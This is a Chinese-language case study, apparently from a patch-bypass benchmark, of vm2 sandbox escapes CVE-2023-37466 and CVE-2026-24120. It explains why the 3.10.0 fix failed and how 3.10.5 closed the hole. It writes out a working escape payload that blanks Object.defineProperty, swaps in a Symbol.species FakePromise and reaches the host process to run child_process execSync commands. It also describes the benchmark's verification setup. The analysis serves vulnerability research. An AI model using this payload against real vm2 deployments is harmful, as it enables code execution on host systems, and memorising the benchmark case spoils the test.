# vm2 Promise species：reset 用了沙箱里能改掉的 defineProperty

- Case：`PCBV2-0037`
- 产品：vm2（Node.js 沙箱库）
- 链：CVE-2023-37466（3.9.19 → 3.10.0）→ CVE-2026-24120（3.10.0 → 3.10.5）
- 源码对着官方 tag `v3.10.0` 的 `lib/setup-sandbox.js`。运行时是整包 `npm` 的 vm2，经 HTTP 把 payload 交给 `new VM().run(...)`，不是抽出来的 `resetPromiseSpecies`。

2023 年 8 月，vm2 3.10.0 为 GHSA-cchq-frgv-rjh5 / CVE-2023-37466 引入 `resetPromiseSpecies`：在 `Promise.prototype.then` 里把被改过的 `@@species` 写回 `localPromise`。advisory GHSA-qvjj-29qf-hp7p / CVE-2026-24120 后来说 *The fix for GHSA-cchq-frgv-rjh5 is insufficient*，因为这个函数用了 `[].includes` 和 `Object.defineProperty`，**两者都可以从沙箱里覆盖**。3.10.5 才改成用闭包里的 `localReflectDefineProperty` 无条件改写 `constructor`。

根因不只是「忘了冻住 Object.defineProperty」。检查插在「读 `constructor[@@species]` 再决定要不要写回去」上；真正把宿主 Error 交出去的是 `@@species` 构造器的 executor；沙箱里的 `Object` 就是那次写入用的对象。下面按 payload 走进去、补丁改了哪几行、检查之后谁去 `then`、仓库里已经有什么更强的原语、残余怎么先把 `defineProperty` 变成空函数再走同一条 species 逃逸。

---

## 这块功能本来在干什么

vm2 让宿主运行不受信任的 JS：`new VM().run(code)`。沙箱里的异常、Promise 拒绝值在进用户回调之前要被 `ensureThis` 包一层，避免宿主 `Error` 上的 `constructor.constructor('return process')()` 之类经典逃逸。ES2022 的 `SpeciesConstructor` 让 `promise.then()` 用 `promise.constructor[Symbol.species]` 来 new 结果 Promise。如果 species 是沙箱提供的 class，它的 `constructor(executor)` 会在宿主侧被调用，`executor` 的第二个参数拿到的是 **尚未消毒的宿主 rejection**。

本 case 的 HTTP 服务把 payload 丢进真实 vm2。逃逸成功后 payload 执行 `cat /flag.txt > /tmp/pcb_result.txt`，oracle 读这个文件。效果通道是 **沙箱外的进程用 child_process 读了金丝雀**。

数据流：

```text
HTTP /exploit?kind=37466|24120
    → new VM().run(payload)
    → 沙箱：async 函数抛错，得到 Promise p
    → p.constructor = { [Symbol.species]: class FakePromise { constructor(executor) { ... } } }
    → p.then()
         V1：globalPromise.prototype.then
              resetPromiseSpecies(this)
                  instanceof 检查
                  [].includes(p.constructor[speciesSymbol])
                  Object.defineProperty(...)     ← 用的是沙箱 Object
              然后才 call 原始 then
         若 species 仍是 FakePromise：
              executor(reject) 拿到宿主 Error
              err.constructor.constructor('return process')()
              process.mainModule.require('child_process')
```

---

## 原始漏洞：then 消毒可以被 species 绕开（CVE-2023-37466，3.9.19）

3.9.19 没有 `resetPromiseSpecies`。沙箱代码把一个 rejected Promise 的 `constructor` 换成带恶意 `@@species` 的对象，再调用 `then()`。宿主实现按规范去 `new SpeciesConstructor`，FakePromise 的 executor 在宿主上下文里跑，rejection 还是宿主 Error。官方 PoC 用 `err.constructor.constructor('return process')().mainModule.require('child_process').execSync(...)`。

本 case 的 seed 就是这条 3.9.19 payload（kind=37466）。逃逸后写 `/tmp/pcb_result.txt`。这就是 v0 + `--seed` 退出码 0。

`Proxy` 在 3.10.0 被设成 `undefined` 并另有加固；species 这条不依赖 Proxy。

---

## 维护者改了什么（CVE-2023-37466 修复，3.10.0）

3.10.0 在 `setup-sandbox.js` 里用沙箱自己的 `Promise` 子类替换全局 Promise，并在 `then` 和 `Reflect.apply` 前复位 species：

```javascript
// lib/setup-sandbox.js  (vm2 v3.10.0)
const speciesSymbol = Symbol.species;
const globalPromise = global.Promise;
class localPromise extends globalPromise {}

const resetPromiseSpecies = (p) => {
	if (p instanceof globalPromise && ![globalPromise, localPromise].includes(p.constructor[speciesSymbol])) {
		Object.defineProperty(p.constructor, speciesSymbol, { value: localPromise });
	}
};

const globalPromiseThen = globalPromise.prototype.then;
globalPromise.prototype.then = function then(onFulfilled, onRejected) {
	resetPromiseSpecies(this);
	return globalPromiseThen.call(this, onFulfilled, onRejected);
};
```

同一文件稍后还 `Object.freeze(localPromise)`，并把 `Object.setPrototypeOf` 换成抛错。测试 `it('[Symbol.species] attack')` 覆盖的是 **不覆盖 defineProperty** 的那条 seed。

V1 谓词的字面意思：

| 片段 | 含义 |
|---|---|
| `p instanceof globalPromise` | 必须是这只 Promise 的实例 |
| `p.constructor[speciesSymbol]` | **读** 当前 species |
| `[globalPromise, localPromise].includes(...)` | 用 **数组 includes**（可被改原型）判断是否已安全 |
| `Object.defineProperty(...)` | 用 **沙箱全局 Object.defineProperty** 写回 |
| 失败则静默 | 没有 try/catch，没有「写失败就抛」 |

它做的是「发现 species 不对就改回去」，不是「then 永远用 localPromise 当构造器」。写入用的函数和 includes 都来自沙箱可见对象。

对 seed 这种只改 species、不碰 `Object.defineProperty` 的 payload，它确实够用：

```text
输入:  p.constructor[@@species] = FakePromise
V1 后: defineProperty 把 species 写回 localPromise
then 按 localPromise 走，FakePromise 的 executor 不会拿到宿主 Error
```

逃逸失败（异步 RangeError / 没有 pcb_result）。这就是 v1 + `--seed` 退出码 10。

补丁默认了两件事：

1. 危险状态长得像 `constructor[@@species]` 不是那两个白名单函数。
2. `Object.defineProperty` 和 `[].includes` 在复位时仍是完好的内建实现。

第二点不成立。更关键的是：这一行复位 **之后** 才 `globalPromiseThen.call`；若复位被变成空操作，原始 `then` 仍按被篡改的 species 去 `new`。

---

## 消毒之后，谁还在用这个 Promise

V1 的 `resetPromiseSpecies(this)` 一结束，同一个 `then` 立刻：

```javascript
	return globalPromiseThen.call(this, onFulfilled, onRejected);
```

宿主 `Promise.prototype.then` 按规范取 `this.constructor[Symbol.species]`。过滤器刚看过（并试图写回）的是这个属性；若写入被空函数吃掉，规范看到的仍是 FakePromise。两套语义中间没有第二次「写成功了吗」检查。

`localReflectApply` 同样先 `resetPromiseSpecies(thisArg)` 再 `apply`。残余通常打 `then` 这一条就够。

逃逸后 `process.mainModule.require('child_process').execSync` 在 **宿主** 跑。`/flag.txt` 出现在 `/tmp/pcb_result.txt`，依据就是 FakePromise executor 拿到了未消毒的宿主 Error，而不是「vm2 又允许了 Proxy」。

---

## 仓库里已经有更强的原语，reset 没用

同一份 `setup-sandbox.js` 开头就把 `Reflect.defineProperty` 收进闭包：

```javascript
const {
	apply,
	...
	defineProperty: localReflectDefineProperty,
	...
} = localReflect;
```

后面设置 `VMError`、改 `prepareStackTrace`、冻 Promise 都走 `localReflectDefineProperty`，**不走** 沙箱 `Object.defineProperty`。谁用闭包里的那份：

| 调用 | 用 `localReflectDefineProperty`？ | 用沙箱 `Object.defineProperty`？ |
|---|---|---|
| 安装 VMError / freeze 相关 | 是 | 否 |
| V1 `resetPromiseSpecies` | **否** | 是 |
| V2 `resetPromiseSpecies`（3.10.5） | 是，失败则 throw | 否 |

V1 等于在最敏感的写入上用了 **可被沙箱替换的全局函数**，而文件里已经有一份不受沙箱 `Object.defineProperty = ...` 影响的原语。不是没有更好的谓词，是 **reset 没用**。

`[].includes` 同样可被 `Array.prototype.includes` 污染。V2 连 instanceof 都放弃了，改成对任意对象无条件 `defineProperty(p, 'constructor', { value: localPromise })`，并在注释里写明 *We do not use instanceof*、*Always define an own data property*。

即便不覆盖 `defineProperty`，只要 `includes` 被改成永远返回 true，V1 的 if 也不会走进写入。残余选择空掉 `defineProperty`，因为 advisory 点名了它。

---

## 这个补丁挡住了什么、没挡住什么

到这里可以把「过滤器 vs 规范 then」落到具体代码：

- `resetPromiseSpecies`：看 species 在不在白名单，再用沙箱 `Object.defineProperty` 写回
- `globalPromiseThen.call`：看 **当前** `constructor[@@species]` 去 new

只要构造一种输入，使「写入函数变成空操作」而「species 仍是 FakePromise」，第一段会「成功返回」，第二段仍然把宿主 Error 送进 FakePromise。

`Object.defineProperty = () => {}` 就是这样来的。它发生在触发 `then` **之前**，所以复位变成 no-op。随后的 payload 与 seed 相同。

```text
沙箱先执行:
  Object.defineProperty = () => {}

再执行 seed 那套:
  p.constructor = { [Symbol.species]: class FakePromise {
    constructor(executor) {
      executor(x => x, err => err.constructor.constructor('return process')()
        .mainModule.require('child_process').execSync('cat /flag.txt > /tmp/pcb_result.txt'))
    }
  }}
  p.then()

resetPromiseSpecies:
  includes 认为 species 不安全
  Object.defineProperty(...)  → 空函数，species 没被改

then:
  new FakePromise(executor) 在宿主跑
  → pcb_result.txt 里出现 PCBFLAG_...
```

这正是 3.9.19 上 seed 用过的那种 species 逃逸。过滤器认为自己已经把 species 复位了，实际上复位依赖的写入入口还在沙箱手里。

GHSA-qvjj-29qf-hp7p 原文：*This function changes the `species` property of promise objects back to a known value. However, it uses the function `[].includes` and `Object.defineProperty` which can be overwritten to prevent the species from being changed.*

---

## 残余仍然走同一条 then / species 路径（CVE-2026-24120）

没有换 VM 配置、没有换 `child_process` sink、没有换 Promise.then 钩子。还是：

```text
GET /exploit?kind=24120
→ 同一 VM.run，先覆盖 defineProperty，再走 species
```

`globalPromise.prototype.then` 仍然先 `resetPromiseSpecies`。V1 那几行照样执行；执行完之后 species 还在；原始 `then` 把宿主 Error 送进 FakePromise；flag 进 `/tmp/pcb_result.txt`。

本 case `verify.sh` 的 residual 把 candidate 写死在脚本里（运行时不读 held-out 文件）：

```text
kind=24120
payload = Object.defineProperty = () => {} + CVE-2023-37466 species PoC
```

和 GHSA-qvjj-29qf-hp7p 官方 PoC 同一构造（advisory 里是 `touch pwned`，本 case 换成读金丝雀）。认证：v1 + `--residual` 退出码 0，结果文件中观察到 `PCBFLAG_...`。

所以残余不是新洞面，而是同一 sink 上三件事叠在一起：谓词用沙箱可替换的函数去写；`then` 发生在「写」之后却不验证写成功；闭包里已经有 `localReflectDefineProperty` 却没用。seed 被挡住只说明「老实改 species 会被写回」，不说明「不能再让 FakePromise 拿到宿主 Error」。

---

## 后来又补了什么（CVE-2026-24120，3.10.5，PR #538）

3.10.5 把复位改成对任意对象用闭包里的 `defineProperty` 覆盖 **实例的 `constructor`**，失败就抛：

```javascript
// V2  v3.10.5
const resetPromiseSpecies = (p) => {
	if (p !== null && (typeof p === 'object' || typeof p === 'function')) {
		let success;
		try {
			success = localReflectDefineProperty(p, 'constructor', {
				__proto__: null, value: localPromise, writable: true, configurable: true
			});
		} catch (e) {
			success = false;
		}
		if (!success) {
			throw new LocalError('Unsafe Promise species cannot be reset');
		}
	}
};
```

注释写明不再用 instanceof（`Reflect.construct` 可以造出带 internal slot 却骗过 instanceof 的 Promise），并消除 TOCTOU（accessor 每次读 species 可以返回不同值）。

对残余输入：

```text
即使 Object.defineProperty = () => {}
V2 仍用 localReflectDefineProperty 在 p 自己身上写 constructor = localPromise
then 看到的 species 来自 localPromise
FakePromise 不再接手
```

公开建议是升级到 3.10.5。vm2 后续还有其它逃逸；本 benchmark 的 v2 只关闭这一条 reference residual。项目后来停止维护沙箱方向，但 3.10.5 对这条链是闭合的。

---

## 从这条链还能看出什么

这些不是分类标签，只是顺着代码继续看时比较自然的问题。

**维护者改错了哪一层。**  
他们改的是 then 前的「把 species 写回」。真正逃出沙箱的是规范在 then 里 `new SpeciesConstructor`。V2 仍在 then 前加码，但改成写自己控制的 `constructor`，并且用闭包原语。

**不是没有更好的谓词。**  
`localReflectDefineProperty` 在文件第 30 行就绑定了。freeze、VMError 都用它。从 V1 的 diff 只能看到新增 `resetPromiseSpecies`；要判断补丁是否闭合，必须看到它调用的是哪一个 `defineProperty`，以及沙箱能否覆盖那个名字。

**同一 `then`、同一 FakePromise，只多了一行覆盖。**  
任何在 `then` 之前能改全局 `Object` 的 payload，在 3.10.0–3.10.4 上都能让复位变成空操作。advisory 影响面写成 `<= 3.10.3`（实际 3.10.4 仍受影响，本 case V2 钉在 3.10.5）。

**读了再写，中间隔着攻击者代码。**  
`p.constructor[speciesSymbol]` 是一次读；`defineProperty` 是一次写。沙箱可以让读看到危险值、让写什么都不做，也可以让 includes 撒谎。V2 选择不再读 species，直接覆盖 constructor。

**金丝雀在沙箱文件系统视图之外是有意的。**  
`/flag.txt` 不是 VM 注入的对象。能写到 `/tmp/pcb_result.txt`，说明跑的是宿主 `child_process`，不是沙箱里的假 require。

---

## 版本、入口、参考

| | tag | `resetPromiseSpecies` | `then` 之后 | species seed | defineProperty 空函数 + species residual |
|---|---|---|---|---|---|
| V0 | 3.9.19 | 无 | 直接 then | 逃逸，读到 flag | （不必） |
| V1 | 3.10.0 | `includes` + 沙箱 `Object.defineProperty` | 原始 then | 复位成功，无 flag | 复位被空掉，逃逸 |
| V2 | 3.10.5 | `localReflectDefineProperty` 写 constructor | 原始 then | 挡 | 挡 |

- Web：`GET /exploit?kind=37466|24120`；效果通道是 `/tmp/pcb_result.txt`
- 认证（本平台）：v0 seed 观察到 flag；v1 seed 未观察到；v1 residual 观察到
- [CVE-2023-37466](https://github.com/advisories/GHSA-cchq-frgv-rjh5)（GHSA-cchq-frgv-rjh5）
- [CVE-2026-24120](https://github.com/patriksimek/vm2/security/advisories/GHSA-qvjj-29qf-hp7p)（GHSA-qvjj-29qf-hp7p）
- V2：[PR #538](https://github.com/patriksimek/vm2/pull/538)
- V1 源码：`https://raw.githubusercontent.com/patriksimek/vm2/v3.10.0/lib/setup-sandbox.js`
- V2 源码：`https://raw.githubusercontent.com/patriksimek/vm2/v3.10.5/lib/setup-sandbox.js`
